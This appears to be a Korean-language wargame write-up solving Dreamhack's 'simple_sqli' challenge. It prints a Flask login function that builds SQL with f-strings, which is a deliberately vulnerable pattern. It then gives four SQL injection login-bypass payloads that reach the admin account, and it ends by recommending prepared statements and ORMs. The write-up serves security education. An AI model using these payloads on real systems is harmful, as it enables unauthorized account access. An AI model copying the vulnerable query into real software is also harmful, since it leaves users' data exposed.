## 들어가며
이번 강의에서는 SQL Injection 취약점이 존재하는 워게임 문제인 [simple_sqli](https://dreamhack.io/wargame/challenges/24/)를 풀어본다.

---
### 배경 지식
본 문제에서는 SQLite를 사용해 데이터베이스를 관리하고 있다. SQLite는 기존에 잘 알려진 MySQL, MSSQL, Oracle 등과 유사한 데이터베이스 관리 시스템으로, 데이터 관리를 위한 필수적인 기능만을 제공하기 때문에 기존 관리 시스템에 비해 가벼워 많은 양의 컴퓨팅 리소스를 제공하기 어려운 임베디드 장비, 비교적 복잡하지 않은 프로그램에서 사용된다. 

---
### 문제 목표 및 기능 요약
simple_sqli 문제의 목표는 관리자 계정으로 로그인하여 출력되는 플래그를 획득하는 것이며, 사이트에 접속해 보면 간단하게 로그인 기능만을 제공하고 있는 것을 확인할 수 있다. 

---
## 웹 서비스 분석
구성된 데이터베이스는 **아래의 schema**를 통해 database.db 파일로 관리하고 있다. 

```python
DATABASE = "database.db" # 데이터베이스 파일명을 database.db로 설정
if os.path.exists(DATABASE) == False: # 데이터베이스 파일이 존재하지 않는 경우,
    db = sqlite3.connect(DATABASE) # 데이터베이스 파일 생성 및 연결
    db.execute('create table users(userid char(100), userpassword char(100));') # users 테이블 생성
    # users 테이블에 관리자와 guest 계정 생성
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit() # 쿼리 실행 확정
    db.close() # DB 연결 종료
```

이 코드로 생성된 데이터베이스의 구조는 다음과 같다. 

| userid | userpassword              |
| ------ | ------------------------- |
| guest  | guest                     |
| admin  | 랜덤 16바이트 문자열을 Hex 형태로 표현  |
이를 살펴보면, `guest` 계정은 사용자가 알 수 있지만, `admin` 계정은 랜덤하게 설정된 16바이트의 문자열이기 때문에 비밀번호를 예상할 수 없다. 

---
### 엔드포인트 분석
아래 코드는 **로그인 페이지를 구성하는 코드**로, 코드를 살펴보면 메소드에 따른 요청마다 서로 다른 기능을 수행하는 것을 알 수 있다. 

```python
# Login 기능에 대해 GET과 POST HTTP 요청을 받아 처리함
@app.route('/login', methods=['GET', 'POST'])
def login():
    # 이용자가 GET 메소드의 요청을 전달한 경우,
    if request.method == 'GET':
        return render_template('login.html') # 이용자에게 ID/PW를 요청받는 화면을 출력
    # POST 요청을 전달한 경우
    else:
        userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,
        userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고
        # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴
        res = query_db(
            f'select * from users where userid="{userid}" and userpassword="{userpassword}"'
        )

        if res: # 쿼리 결과가 존재하는 경우
            userid = res[0] # 로그인할 계정을 해당 쿼리 결과의 결과에서 불러와 사용

            if userid == 'admin': # 이 때, 로그인 계정이 관리자 계정인 경우
                return f'hello {userid} flag is {FLAG}' # flag를 출력

            # 관리자 계정이 아닌 경우, 웰컴 메시지만 출력
            return f'<script>alert("hello {userid}");history.go(-1);</script>'

        # 일치하는 회원 정보가 없는 경우 로그인 실패 메시지 출력
        return '<script>alert("wrong");history.go(-1);</script>'
```

**GET**
`userid`와 `userpassword`를 입력할 수 있는 로그인 페이지를 제공하며, 입력창에 guest를 각각 입력하면 로그인을 수행할 수 있다. 

**POST**
사용자가 입력한 계정 정보가 데이터베이스에 존재하는지 확인하며, 로그인 계정이 `admin`일 경우 FLAG를 출력한다.

---
### 취약점 분석
simple_sqli 문제를 풀기 위한 접근 방법은 크게 두 가지로 나뉜다. 

1. `admin` 계정의 비밀번호를 모른 채로 **로그인 자체를 우회**하는 방법
2. `admin` 계정의 비밀번호를 알아내 **관리자 계정으로 로그인**하는 방법

이번 강의에서는 첫 번째 방법으로 풀어 볼 것이고, [[Exercise - Blind SQL Injection|다음 강의]]에서는 두 번째 방법으로 각각 풀어본다. 

아래 코드를 살펴보면, `userid`와 `userpassword`를 사용자에게 입력받고, 동적으로 쿼리문을 생성한 뒤 `query_db` 함수에서 SQLite에 질의한다. 이렇게 동적으로 생성한 쿼리를 RawQuery라고 한다. 

**RawQuery를 생성할 때, 사용자의 입력값이 쿼리문에 그대로 포함되면 SQL Injection 취약점에 노출될 수 있다.** 이는 사용자의 입력값을 아무 의심 없이 그대로 넣기 때문에 발생하는 취약점으로, 사용자의 입력값을 검사하기만 해도 어느 정도는 안전해진다. 

```python
def login(): # login 함수 선언
    ...
    userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,
    userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고
    # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴
    res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
    ...
    
def query_db(query, one=True): # query_db 함수 선언
    cur = get_db().execute(query) # 연결된 데이터베이스에 쿼리문을 질의
    rv = cur.fetchall() # 쿼리문 내용을 받아오기
    cur.close() # 데이터베이스 연결 종료
    return (rv[0] if rv else None) if one else rv # 쿼리문 질의 내용에 대한 결과를 반환
```

![[Pasted image 20260218202917.png]]

---
## 익스플로잇
이 워게임 문제를 해결하기 위해서는 `userid`가 `admin`인 계정으로 로그인을 우회해서 로그인해야 한다. 

아래의 쿼리는 로그인을 위해 실행하는 쿼리문으로, 이를 참고해서 `admin`이라는 결과가 반환되도록 쿼리문을 조작해야 한다. 

```sqlite
SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";
```

로그인을 우회하기 위한 가장 간단한 방법으로는 패스워드를 검증하는 부분을 건너뛰면 되는데, 그 기능을 구현하기 위한 다양한 공격 쿼리들을 `userid` 칸에 넣을 수 있다. 

```sqlite
SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"

SELECT * FROM users WHERE userid="admin" or 1 AND userpassword="DUMMY"

SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"

SELECT * FROM users WHERE userid="" or 1 LIMIT 1, 1-- "AND userpassword="DUMMY"
```

1. `userid` 검색 조건만을 처리하도록 하고, 뒤의 내용은 주석처리
	1. ID: `admin"--`
	2. PW: 아무 거나
2. `userid` 검색 조건 뒤에 `OR (조건)` 을 추가해 뒤의 내용을 무조건 `TRUE` 로
	1. ID: `admin" or "1`
	2. PW: 아무 거나
3. `userpassword` 조건에 임의의 값을 추가한 뒤 `OR (조건)`을 추가
	1. ID: `admin`
	2. PW: 아무 거나 + 뒤에 `or userid="admin"` 추가
4. `userid` 검색 조건 뒤에 `or 1`을 추가해 테이블의 모든 내용을 반환, `LIMIT` 절을 사용해 두 번째 Row인 `admin`을 반환
	1. ID: `" or 1 LIMIT 1, 1--`
	2. PW: 아무 거나

---
## 마치며
이번 강의에서는 simple_sqli 문제를 통해 사용자의 입력이 RawQuery에 포함될 경우 발생할 수 있는 문제점인 SQL Injection에 대해 알아봤다. 

실습 워게임에서는 단순하게 관리자 계정으로 로그인해 임의의 권한을 획득할 수 있었으나, 실제로는 그것 외에도 비밀 게시글을 비밀번호 없이 조회하거나, 회원 정보 조회 시 사용자의 번호에 악성 SQL 쿼리를 삽입해 임의 회원의 정보를 출력하는 등의 행위가 가능하다. 

이런 문제점들은 사용자의 입력값이 포함된 쿼리를 아무 검증 없이 통과시키고 실행하는 것에서 발생하는 것으로, SQL 데이터를 처리할 때 쿼리문을 직접 생성하는 방식이 아닌 **Prepared Statement**와 **Object Relational Mapping (ORM)** 을 사용해 해결할 수 있다. 특히, Prepared Statement는 동적 쿼리가 전달되면, 내부적으로 쿼리 분석을 실행해 안전한 쿼리문을 생성한다.

![[Pasted image 20260218202743.png]]